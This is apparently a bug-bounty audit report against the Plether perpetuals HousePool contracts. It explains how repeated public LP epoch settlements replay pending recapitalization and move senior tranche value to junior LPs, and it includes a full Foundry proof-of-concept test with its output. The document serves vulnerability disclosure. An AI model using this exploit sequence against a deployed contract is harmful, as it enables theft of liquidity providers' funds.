# \#100094 [SC-High] repeated reconciliation replays pending claims and reallocates tranche value

**Submitted on Nov 16th 2026 at 08:15:32 UTC by @krikolkk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100094
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
HousePool reserves recapitalization until reconciliation can assign it to senior, and permissionless LP epoch settlements run reconciliation. However, each pass caps the residual recap against gross distributable assets again, consuming the same backing repeatedly and permanently shifting senior’s recovery to junior.

## Vulnerability Details
The owner recapitalizes while trader liabilities exceed pool equity. The first reconciliation assigns the distributable portion to senior and leaves the unbacked remainder pending. For a 10,000 recap with a 6,000 deficit, it credits 4,000 to senior, retains 6,000, and keeps the HWM at 10,000.

Before the deficit changes, any caller can trigger further reconciliation through `OrderRouter.settleLpEpoch`. A junior LP can create epoch progress by requesting redemption of zero-value shares; settlement refunds the request and reconciles again. Each pass consumes up to the same 4,000 of distributable despite no new cash, reducing pending recap and, once the residual falls below distributable, leaving the senior HWM at 6,000.

When the deficit later resolves, senior receives 6,000 instead of 10,000 and junior receives the displaced 4,000. In the larger reproduction, four extra settlements consume 51,988.60 USDG of pending recap.

## Impact Details
Senior LPs permanently lose recapitalization value intended for senior restoration, bounded by the unbacked residual `R − D`. In the reproduced case, 51,988.60 USDG of senior restoration is lost; after the deficit resolves, junior receives 83,790.02 USDG in wallet proceeds instead of zero.

With a stale nominal recap target, reconciliation can instead count an unbacked remainder as senior recovery and transfer junior principal or later trading revenue to senior. This is bounded by available junior equity and revenue up to the stale target; the lead also identifies a stale-mark path that can inflate senior principal above distributable value.

If pending trading revenue is replayed alongside recapitalization, the waterfall can send recap surplus to junior. The noted example shifts 100 units, bounded by the residual revenue bucket and distributable value.

Draining pending recap releases its withdrawal reservation before the trader deficit resolves. Senior withdrawals can then use cash reserved for unresolved trader liabilities, subject to pool withdrawal checks; the reproduction increases free assets and maximum senior withdrawal from zero to 3,259.65 USDG.

Repeated preview accounting can understate junior principal. If the owner then calls `assignUnassignedAssets(false, receiver)`, junior bootstrap shares can be minted against that lower value and dilute existing junior holders.

## References
- [`HousePool._reconcile` and `_settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599)
- [`HousePoolPendingPreviewLib.capClaimantBuckets` and `HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L68-L183) and [planReconcile](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L105)
- [`OrderRouter.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484)


## Proof of Concept

## Proof of Concept
Save the test below as `test/poc/PoC/PoC.t.sol` (it uses the repository's own `test/perps/BasePerpTest.sol` fixture) and run it from the package root with:

```console
FOUNDRY_TEST=test/poc/PoC FOUNDRY_DISABLE_NIGHTLY_WARNING=1 forge test --match-path "test/poc/PoC/*.t.sol" -vvvv
```

The test `test_routineSettlementsDrainPendingRecapAndSeniorHwm` exercises real LP deposits, trader orders, a terminal deficit, owner recapitalization, and repeated public LP epoch settlements.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "../../perps/BasePerpTest.sol";

/// @notice Reconcile is not idempotent while a pending recapitalization exceeds distributable value.
/// @dev Every state is reached through public entry points only: LPs deposit through the vaults, traders open and
///      close through `router.commitOrder` + `router.executeOrder` against mock-Pyth prices, the pool is pushed into a
///      real terminal deficit by genuine trader profits (no token burns, no storage writes), the owner recapitalizes
///      and clears degraded mode through the engine's own owner functions, and every LP settlement goes through the
///      permissionless `router.settleLpEpoch` / `pool.settleLpEpoch`.
contract RecapReconcilePoc is BasePerpTest {

    address constant JUNIOR_LP = address(0x1111);
    address constant SENIOR_LP = address(0x2222);
    address constant TRADER_A = address(0xA11CE); // LONG, cashes out at a profit when the price falls
    address constant TRADER_B = address(0xB0B); // SHORT, profits when the price rises
    address constant KEEPER = address(0xA0FF);

    uint256 constant P0 = 1e8; // entry price of both positions
    uint256 constant P1 = 0.3e8; // price falls: LONG (A) cashes out ~66.5k of the pool's cash
    uint256 constant P2 = 1.9e8; // price rebounds: SHORT (B) is now ~85.5k in profit against ~33.6k of pool cash
    uint256 constant SIZE = 95_000e18; // notional of each position (max profit of each side = 95,000 USDG)

    struct Outcome {
        uint256 seniorPrincipal; // tranche principals after the deficit resolved, before any LP redeems
        uint256 juniorPrincipal;
        uint256 unassigned;
        uint256 seniorLpCash; // tokens the LPs actually withdrew
        uint256 juniorLpCash;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 1e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 0,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ---------------------------------------------------------------- helpers (all public entry points)

    /// @dev Mock-Pyth update for a mark refresh / LP settlement (no queued order): published at the current time.
    function _markUpdate(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    /// @dev LP deposit: ERC-7540 request, epoch settlement through the Router, claim.
    function _fundTranche(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(id));
        router.settleLpEpoch(_markUpdate(P0));
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    function _routerOpen(
        address who,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, P0, false);
        bytes[] memory update = _mockPythUpdateData(P0);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, update);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executes");
    }

    function _routerClose(
        address who,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) internal {
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, 0, side == CfdTypes.Side.LONG ? type(uint256).max : 0, true);
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, update);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executes");
    }

    /// @dev One routine hourly LP settlement at an unchanged oracle price. The Pool only settles an epoch that makes
    ///      LP progress, so the (wiped) junior LP queues its worthless shares for redemption each hour; the permissionless
    ///      `router.settleLpEpoch` reconciles the pool and refunds the zero-value request, then the LP takes its shares
    ///      back and waits out the deposit cooldown. Nothing about the oracle, the positions or the cash changes.
    function _hourlySettle() internal {
        uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 id = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
        vm.warp(pool.lpEpochStart(id));
        router.settleLpEpoch(_markUpdate(P2));
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeemRefund(id, JUNIOR_LP, JUNIOR_LP);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
    }

    function _log(
        string memory tag
    ) internal view {
        console2.log(tag);
        console2.log("  senior principal", pool.seniorPrincipal());
        console2.log("  junior principal", pool.juniorPrincipal());
        console2.log("  senior HWM      ", pool.seniorHighWaterMark());
        console2.log("  pending recap   ", pool.pendingRecapitalizationAssets());
        console2.log("  pool cash       ", pool.totalAssets());
        console2.log("  free assets     ", pool.getFreeAssets());
    }

    /// @dev The deficit resolves (price reverts to entry, B closes flat), then both LPs redeem everything and the real
    ///      token payouts are measured.
    function _resolveDeficitAndRedeem() internal returns (Outcome memory o) {
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _routerClose(TRADER_B, CfdTypes.Side.SHORT, SIZE, P0);
        assertEq(engine.degradedMode(), false);

        // Tranche principals as the next reconcile will book them (simulated; no open positions are left).
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        (o.seniorPrincipal, o.juniorPrincipal,,) = pool.getPendingTrancheState();

        uint256 jShares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        uint256 sShares = seniorVault.maxRequestRedeem(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 sId = seniorVault.requestRedeem(sShares, SENIOR_LP, SENIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 jId = juniorVault.requestRedeem(jShares, JUNIOR_LP, JUNIOR_LP);
        vm.warp(pool.lpEpochStart(sId));
        pool.settleLpEpoch(0, 0); // no open positions left: permissionless
        o.unassigned = pool.unassignedAssets();

        uint256 jBefore = settlementToken.balanceOf(JUNIOR_LP);
        uint256 sBefore = settlementToken.balanceOf(SENIOR_LP);
        uint256 sClaim = seniorVault.claimableRedeemRequest(sId, SENIOR_LP);
        uint256 jClaim = juniorVault.claimableRedeemRequest(jId, JUNIOR_LP);
        if (sClaim > 0) {
            vm.prank(SENIOR_LP);
            seniorVault.claimRedeem(sId, sClaim, SENIOR_LP, SENIOR_LP);
        }
        if (jClaim > 0) {
            vm.prank(JUNIOR_LP);
            juniorVault.claimRedeem(jId, jClaim, JUNIOR_LP, JUNIOR_LP);
        }
        o.seniorLpCash = settlementToken.balanceOf(SENIOR_LP) - sBefore;
        o.juniorLpCash = settlementToken.balanceOf(JUNIOR_LP) - jBefore;
    }

    // ------------------------------------------------------------------- PoC

    function test_routineSettlementsDrainPendingRecapAndSeniorHwm() public {
        // ---------------- ARRANGE: a healthy pool (2 x 50k incl. seeds) and two balanced traders ----------------
        _fundTranche(juniorVault, JUNIOR_LP, 49_000e6);
        _fundTranche(seniorVault, SENIOR_LP, 49_000e6);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        assertEq(pool.totalAssets(), 100_000e6, "pool: 49k + 49k + 2 x 1k seed");

        _fundTrader(TRADER_A, 12_000e6);
        _fundTrader(TRADER_B, 85_000e6);
        _routerOpen(TRADER_A, CfdTypes.Side.LONG, SIZE, 10_000e6);
        _routerOpen(TRADER_B, CfdTypes.Side.SHORT, SIZE, 80_000e6);
        // Both sides carry a 95k max-profit envelope; the engine only requires cash >= max(L, S) + 0.25%.
        assertEq(engine.degradedMode(), false);

        // ---------------- ACT 1: genuine trader profit drains the pool below the other side's unrealised profit ----
        // Price falls to 0.30: A cashes out 0.70 x 95k = 66.5k of real USDG from the pool, via the Router.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _routerClose(TRADER_A, CfdTypes.Side.LONG, SIZE, P1);
        assertTrue(engine.degradedMode(), "pool cash (~33.6k) < remaining max liability (95k): degraded mode");
        uint256 cashAfterA = pool.totalAssets();
        assertApproxEqAbs(cashAfterA, 100_000e6 - 66_500e6, 200e6, "A was paid ~66.5k of pool cash");

        // Price rebounds to 1.90: B's open SHORT is 0.90 x 95k = 85.5k in profit but the pool only holds ~33.6k.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        router.updateMarkPrice(_markUpdate(P2));
        int256 priceDelta = engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;
        assertEq(priceDelta, -85_500e6, "B's unrealised profit, independent: 95,000 x (1.90 - 1.00)");
        // Public-path summary: the open-time solvency rule only needs cash >= max(longMaxProfit, shortMaxProfit), not the
        // sum. A's realised profit therefore leaves B's still-open profit larger than the pool's remaining cash.
        assertGt(uint256(-priceDelta), cashAfterA, "open trader profit exceeds pool cash while B is still open");
        assertApproxEqAbs(pool.seniorPrincipal(), 50_000e6, 1e5, "principals are still stale-high before the reconcile");
        assertApproxEqAbs(pool.juniorPrincipal(), 50_000e6, 1e5, "(only differ by a few cents of senior coupon)");
        uint256 deficitX = 85_500e6 - cashAfterA; // open trader profit above pool cash
        console2.log("pool cash before recap", cashAfterA);
        console2.log("terminal deficit X   ", deficitX);

        // ---------------- ACT 2: the owner recapitalizes (R >> D) and clears degraded mode ----------------
        // Choose D = X/4 so that R = X + D = 5 D; R also has to lift cash above max liability to clear degraded mode.
        uint256 distributableD = deficitX / 4;
        uint256 recapR = deficitX + distributableD;
        settlementToken.mint(address(this), recapR);
        settlementToken.approve(address(engine), recapR);
        engine.recapitalizePool(recapR);
        engine.clearDegradedMode();
        assertEq(pool.pendingRecapitalizationAssets(), recapR);
        assertEq(pool.totalAssets(), cashAfterA + recapR);

        // Settlement #1 (routine hourly LP settlement): the correct state.
        _hourlySettle();
        _log("after settle #1 (correct state)");
        assertEq(pool.juniorPrincipal(), 0, "junior wiped by the deficit");
        assertEq(pool.seniorPrincipal(), distributableD, "senior = D");
        assertEq(pool.seniorHighWaterMark(), recapR, "HWM = R");
        assertEq(pool.pendingRecapitalizationAssets(), deficitX, "R - D = X still reserved");
        // The pending recap is reserved against LP withdrawals (fresh mark, so only the reservation can block them).
        router.updateMarkPrice(_markUpdate(P2));
        assertEq(pool.getFreeAssets(), 0, "no withdrawable cash while the recap is pending");
        assertEq(pool.getMaxSeniorWithdraw(), 0);
        uint256 afterFirstSettle = vm.snapshotState();

        // ---------------- ATTACK branch: routine settlements with NO engine change and NO new cash ----------------
        uint256 settles;
        while (pool.pendingRecapitalizationAssets() > 0 && settles < 10) {
            _hourlySettle();
            ++settles;
            _log("extra settle (price unchanged, no cash arrived)");
        }
        console2.log("extra settlements needed", settles);

        assertEq(pool.totalAssets(), cashAfterA + recapR, "no cash entered the pool");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "the whole pending recap was consumed");
        // Independent derivation: each round takes D off the HWM, so it decays from R = 5D down to D (+ rounding dust).
        assertEq(pool.seniorHighWaterMark(), distributableD + (deficitX % distributableD), "HWM decayed to D");
        assertEq(settles, 4, "R = 5D: four extra settlements take the HWM from R down to D");
        assertEq(pool.seniorPrincipal(), distributableD);
        // Secondary effect: the recap's withdrawal reservation is gone, so cash that backs the unresolved deficit
        // becomes withdrawable. Independent: cash - maxLiability(95k) - ceil(0.25% buffer).
        uint256 maxLiability = 95_000e6;
        uint256 bufferTarget = (maxLiability * 25 + 9_999) / 10_000; // ceil(0.25% of max liability)
        uint256 expectedFree = pool.totalAssets() - maxLiability - bufferTarget;
        router.updateMarkPrice(_markUpdate(P2));
        assertEq(pool.getFreeAssets(), expectedFree, "reservation released early");
        assertGt(expectedFree, 2_000e6);
        assertEq(pool.getMaxSeniorWithdraw(), expectedFree, "senior can now withdraw while the deficit is open");
        Outcome memory attacked = _resolveDeficitAndRedeem();

        // ---------------- CONTROL branch: identical history without the extra settlements ----------------
        vm.revertToState(afterFirstSettle);
        Outcome memory control = _resolveDeficitAndRedeem();

        console2.log("--- deficit resolved ---");
        console2.log("senior principal, with extra settlements", attacked.seniorPrincipal);
        console2.log("senior principal, control               ", control.seniorPrincipal);
        console2.log("junior principal, with extra settlements", attacked.juniorPrincipal);
        console2.log("junior principal, control               ", control.juniorPrincipal);
        console2.log("unassigned, with extra settlements      ", attacked.unassigned);
        console2.log("unassigned, control                     ", control.unassigned);
        console2.log("senior LP cash, with extra settlements  ", attacked.seniorLpCash);
        console2.log("senior LP cash, control                 ", control.seniorLpCash);
        console2.log("junior LP cash, with extra settlements  ", attacked.juniorLpCash);
        console2.log("junior LP cash, control                 ", control.juniorLpCash);

        // Correct (idempotent) accounting: the recap fully restores senior to R and junior gets nothing; the rest of
        // the recovered cash (the old pool cash) is quarantined as unassigned.
        assertEq(control.seniorPrincipal, recapR, "control: senior restored to R");
        assertEq(control.juniorPrincipal, 0, "control: junior receives nothing");
        assertEq(control.unassigned, cashAfterA, "control: remaining cash is unassigned");
        assertEq(control.juniorLpCash, 0);

        // After the extra no-op settlements: senior is stuck at D, junior captures everything else.
        assertEq(attacked.seniorPrincipal, distributableD, "senior stuck at D");
        assertEq(control.seniorPrincipal - attacked.seniorPrincipal, recapR - distributableD, "senior loses R - D");
        assertEq(attacked.juniorPrincipal, cashAfterA + recapR - distributableD, "junior captures all the rest");
        assertEq(attacked.unassigned, 0);
        assertEq(
            attacked.seniorPrincipal + attacked.juniorPrincipal + attacked.unassigned,
            control.seniorPrincipal + control.juniorPrincipal + control.unassigned,
            "same total value, redistributed"
        );
        // R - D of senior's restoration moved to junior (the other cashAfterA of junior's gain was quarantined).
        assertEq(attacked.juniorPrincipal - control.juniorPrincipal - control.unassigned, recapR - distributableD);

        // Real tokens in the LPs' wallets (each LP holds 98% of its tranche's shares, the rest are locked seeds).
        assertApproxEqAbs(
            control.seniorLpCash - attacked.seniorLpCash,
            (recapR - distributableD) * 49 / 50,
            1e6,
            "senior LP withdraws ~98% of R - D less"
        );
        assertApproxEqAbs(
            attacked.juniorLpCash, attacked.juniorPrincipal * 49 / 50, 1e6, "junior LP withdraws ~98% of 85.5k"
        );
    }
}
```

Output:

```console
Ran 1 test for test/poc/PoC/PoC.t.sol:RecapReconcilePoc
[PASS] test_routineSettlementsDrainPendingRecapAndSeniorHwm() (gas: 16532647)
Logs:
  pool cash before recap 33511400000
  terminal deficit X    51988600000
  after settle #1 (correct state)
    senior principal 12997150000
    junior principal 0
    senior HWM       64985750000
    pending recap    51988600000
    pool cash        98497150000
    free assets      0
  extra settle (price unchanged, no cash arrived)
    senior principal 12997150000
    junior principal 0
    senior HWM       51988600000
    pending recap    38991450000
    pool cash        98497150000
    free assets      0
  extra settle (price unchanged, no cash arrived)
    senior principal 12997150000
    junior principal 0
    senior HWM       38991450000
    pending recap    25994300000
    pool cash        98497150000
    free assets      0
  extra settle (price unchanged, no cash arrived)
    senior principal 12997150000
    junior principal 0
    senior HWM       25994300000
    pending recap    12997150000
    pool cash        98497150000
    free assets      0
  extra settle (price unchanged, no cash arrived)
    senior principal 12997150000
    junior principal 0
    senior HWM       12997150000
    pending recap    0
    pool cash        98497150000
    free assets      3259650000
  extra settlements needed 4
  --- deficit resolved ---
  senior principal, with extra settlements 12997150000
  senior principal, control                64985750000
  junior principal, with extra settlements 85500000000
  junior principal, control                0
  unassigned, with extra settlements       0
  unassigned, control                      33511400000
  senior LP cash, with extra settlements   12737202347
  senior LP cash, control                  63686011733
  junior LP cash, with extra settlements   83790015306
  junior LP cash, control                  0
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.15ms (18.26ms CPU time)
Ran 1 test suite in 25.59ms (24.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
